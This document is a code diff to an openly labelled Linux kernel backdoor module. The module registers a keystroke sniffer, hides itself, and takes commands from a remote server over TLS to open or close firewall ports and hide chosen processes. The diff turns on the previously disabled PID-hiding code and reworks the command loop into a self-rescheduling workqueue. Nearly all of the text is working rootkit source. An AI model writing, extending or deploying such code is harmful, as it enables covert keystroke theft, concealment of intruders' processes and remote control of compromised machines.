@@ -50,6 +50,8 @@ struct nf_hook_ops nfho;
 struct service* svc;
 struct sock* nl_sk;
 
+static struct work_struct w;
+
 unsigned char* buffer;
 u16* open_ports;
 u16* closed_ports;
@@ -81,15 +83,10 @@ int start_transmit(void);
 int init_userspace_conn(void);
 void UpdateChecksum(struct sk_buff* skb);
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
-int reboot_cb(struct notifier_block* nblock, unsigned long code, void* _param);
 
 //Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
         .notifier_call = keysniffer_cb,
-};
-
-static struct notifier_block reboot_blk = {
-        .notifier_call = reboot_cb,
 };
 
 /*
@@ -285,17 +282,7 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
     return size;
 }
 
-/*
- * function:
- *    read_TLS
- *
- * return:
- *    int
- *
- * notes:
- * Handler for reading and writing kernel module commands relating to firewall
- */
-int read_TLS(void) {
+void read_TLS(struct work_struct* work) {
     int len;
     u16 tmp_port;
     const char* bad_len = "Invalid command length\n";
@@ -309,96 +296,81 @@ int read_TLS(void) {
     struct pid* newpid;
     struct pid* oldpid;
 
-    while (!kthread_should_stop()) {
-        tmp_port = 0;
-        memset(buffer, 0, MAX_PAYLOAD);
-        len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
-        if (len < 0) {
-            if (len == -EAGAIN) {
-                continue;
-            } else {
-                printk(KERN_INFO "Received error message on read %d\n", len);
-                break;
-            }
-        }
-        if (len == 0) {
-            continue;
-        }
-        printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
-        if (len < 5) {
-            strcpy(buffer, bad_len);
-            send_msg(svc->tls_socket, buffer, strlen(bad_len));
-            continue;
-        }
-        if (memcmp("open ", buffer, 5) == 0) {
-            //Open a port
-            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-                strcpy(buffer, bad_port);
-                send_msg(svc->tls_socket, buffer, strlen(bad_port));
-                continue;
-            }
-            open_ports[open_port_count++] = tmp_port;
-            strcpy(buffer, open);
-            send_msg(svc->tls_socket, buffer, strlen(open));
-        } else if (memcmp("close ", buffer, 6) == 0) {
-            //Close a port
-            if (kstrtou16(buffer + 6, 10, &tmp_port)) {
-                strcpy(buffer, bad_port);
-                send_msg(svc->tls_socket, buffer, strlen(bad_port));
-                continue;
-            }
-            if (tmp_port == PORT) {
-                strcpy(buffer, bad_drop);
-                send_msg(svc->tls_socket, buffer, strlen(bad_drop));
-                continue;
-            }
-            closed_ports[closed_port_count++] = tmp_port;
-            strcpy(buffer, close);
-            send_msg(svc->tls_socket, buffer, strlen(close));
-        } else if (memcmp("clear", buffer, 5) == 0) {
-            open_port_count = 0;
-            closed_port_count = 0;
-            strcpy(buffer, clear);
-            send_msg(svc->tls_socket, buffer, strlen(clear));
-        } else if (memcmp("test", buffer, 4) == 0) {
-            if (hidden) {
-                show();
-            } else {
-                hide();
-            }
-        } else if (memcmp("hide", buffer, 4) == 0) {
-#if 0
-            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-                strcpy(buffer, bad_port);
-                send_msg(svc->tls_socket, buffer, strlen(bad_port));
-                continue;
-            }
-            for_each_process(ts) {
-                if (ts->pid == tmp_port) {
-                    printk(KERN_INFO "Hiding PID %d\n", tmp_port);
-                    write_lock(my_tasklist_lock);
-
-                    //Increment refcount and store reference to original pid struct
-                    oldpid = get_pid(get_task_pid(ts, PIDTYPE_PID));
-
-                    newpid = alloc_pidR(get_task_pid(ts, PIDTYPE_PID)->numbers[0].ns);
-                    newpid->numbers[0].nr = 123456789;
-                    change_pidR(ts, PIDTYPE_PID, newpid);
-
-                    hidden_procs[hidden_count].ts = ts;
-                    hidden_procs[hidden_count].p = oldpid;
-                    ++hidden_count;
-
-                    write_unlock(my_tasklist_lock);
-                }
-            }
-#endif
-        } else {
-            strcpy(buffer, unknown);
-            send_msg(svc->tls_socket, buffer, strlen(unknown));
-        }
+    tmp_port = 0;
+    memset(buffer, 0, MAX_PAYLOAD);
+    len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
+    printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
+    if (len < 5) {
+        strcpy(buffer, bad_len);
+        send_msg(svc->tls_socket, buffer, strlen(bad_len));
+        return;
     }
-    return 0;
+    if (memcmp("open ", buffer, 5) == 0) {
+        //Open a port
+        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
+            strcpy(buffer, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            return;
+        }
+        open_ports[open_port_count++] = tmp_port;
+        strcpy(buffer, open);
+        send_msg(svc->tls_socket, buffer, strlen(open));
+    } else if (memcmp("close ", buffer, 6) == 0) {
+        //Close a port
+        if (kstrtou16(buffer + 6, 10, &tmp_port)) {
+            strcpy(buffer, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            return;
+        }
+        if (tmp_port == PORT) {
+            strcpy(buffer, bad_drop);
+            send_msg(svc->tls_socket, buffer, strlen(bad_drop));
+            return;
+        }
+        closed_ports[closed_port_count++] = tmp_port;
+        strcpy(buffer, close);
+        send_msg(svc->tls_socket, buffer, strlen(close));
+    } else if (memcmp("clear", buffer, 5) == 0) {
+        open_port_count = 0;
+        closed_port_count = 0;
+        strcpy(buffer, clear);
+        send_msg(svc->tls_socket, buffer, strlen(clear));
+    } else if (memcmp("test", buffer, 4) == 0) {
+        if (hidden) {
+            show();
+        } else {
+            hide();
+        }
+    } else if (memcmp("hide", buffer, 4) == 0) {
+        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
+            strcpy(buffer, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            return;
+        }
+        for_each_process(ts) {
+            if (ts->pid == tmp_port) {
+                printk(KERN_INFO "Hiding PID %d\n", tmp_port);
+                write_lock(my_tasklist_lock);
+
+                //Increment refcount and store reference to original pid struct
+                oldpid = get_pid(get_task_pid(ts, PIDTYPE_PID));
+
+                newpid = alloc_pidR(get_task_pid(ts, PIDTYPE_PID)->numbers[0].ns);
+                newpid->numbers[0].nr = 123456789;
+                change_pidR(ts, PIDTYPE_PID, newpid);
+
+                hidden_procs[hidden_count].ts = ts;
+                hidden_procs[hidden_count].p = oldpid;
+                ++hidden_count;
+
+                write_unlock(my_tasklist_lock);
+            }
+        }
+    } else {
+        strcpy(buffer, unknown);
+        send_msg(svc->tls_socket, buffer, strlen(unknown));
+    }
+    schedule_work(&w);
 }
 
 /*
@@ -433,14 +405,6 @@ int init_userspace_conn(void) {
         printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
         return error;
     }
-
-#if 0
-    error = kernel_setsockopt(svc->tls_socket, SOL_SOCKET, SOCK_NONBLOCK, &(int){1}, sizeof(int))
-    if (error < 0) {
-        printk(KERN_ERR "Cannot set socket to nonblocking: %d\n", error);
-        return error;
-    }
-#endif
 
     return 0;
 }
@@ -620,7 +584,6 @@ void my_custom_cleanup(void) {
         kfree(closed_ports);
     }
 
-#if 0
     write_lock(my_tasklist_lock);
     for (i = 0; i < hidden_count; ++i) {
         change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
@@ -629,23 +592,6 @@ void my_custom_cleanup(void) {
         force_sig(SIGKILL, hidden_procs[i].ts);
     }
     write_unlock(my_tasklist_lock);
-#endif
-}
-
-//Kills the kernel module indirectly on reboot
-int reboot_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
-    printk(KERN_ALERT "Entered reboot callback\n");
-    if (code == SYS_RESTART) {
-        printk(KERN_ALERT "Hit restart block\n");
-        show();
-
-        //my_custom_cleanup();
-
-        const char* foobar = "foobar";
-        send_msg(svc->tls_socket, foobar, strlen(foobar));
-    }
-    printk(KERN_ALERT "Exiting reboot callback\n");
-    return NOTIFY_DONE;
 }
 
 /*
@@ -696,20 +642,14 @@ static int __init mod_init(void) {
     open_ports = kmalloc(2 * 65536, GFP_KERNEL);
     closed_ports = kmalloc(2 * 65536, GFP_KERNEL);
 
-    svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
+    INIT_WORK(&w, read_TLS);
+    schedule_work(&w);
 
     hide();
 
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
-    //register_reboot_notifier(&reboot_blk);
-
-    //kthread_run((void*) consume_keys, NULL, "kworker");
-
-    //const char *foobar = "foobar";
-    //send_msg(svc->tls_socket, foobar, strlen(foobar));
-
     return 0;
 }
 
